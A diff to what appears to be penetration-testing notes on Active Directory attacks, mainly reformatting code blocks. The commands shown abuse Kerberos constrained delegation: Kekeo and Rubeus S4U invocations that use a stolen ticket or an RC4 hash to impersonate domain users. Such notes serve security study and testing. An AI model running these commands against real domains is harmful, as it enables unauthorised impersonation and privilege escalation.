@@ -705,9 +705,11 @@ Request TGT:
 
 Using S4U and the previous TGT, request a TGS:
 
-``` tgs::s4u /tgt:CERT_WE_STOLE.kirbi
+```
+tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 /user:user_we_are_impersonating@ecorp.lab
-/service:ServiceListedIn{msDS-AllowedToDelegateTo} ```
+/service:ServiceListedIn{msDS-AllowedToDelegateTo}
+```
 
 ```
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}
@@ -718,9 +720,9 @@ NOW - we could just do it all in one RUBEUS command:
 ```Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a```
 
 This would do all the steps for us!
-```
+
  If a /user and rc4/aes256 hash is supplied, the s4u module performs an asktgt action first, using the returned ticket for the steps following. If a TGT /ticket:X is supplied, that TGT is used instead.
- ```
+
  
  -https://github.com/GhostPack/Rubeus#s4u
 
